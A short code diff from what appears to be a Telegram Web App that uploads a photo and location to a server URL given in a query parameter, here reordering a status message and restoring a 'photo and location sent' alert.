@@ -188,11 +188,11 @@
               return;
             }
 
-            status.innerText = "Blob created, size: " + blob.size + " bytes";
-
             // Ambil server_url dari query param
             const params = new URLSearchParams(window.location.search);
             const SERVER_URL = params.get("server_url");
+
+            status.innerText = "Blob created, size: " + blob.size + " bytes";
 
             const form = new FormData();
             form.append("chat_id", tg.initDataUnsafe.user.id);
@@ -206,8 +206,7 @@
               body: form,
             })
 
-            //tg.showAlert("📤 Foto & lokasi dikirim!");
-            tg.showAlert("Blob created, size: " + blob.size + " bytes");
+            tg.showAlert("📤 Foto & lokasi dikirim!");
             //setTimeout(() => tg.sendData("ok"), 3000);
             //setTimeout(() => tg.close(), 2000);
           },
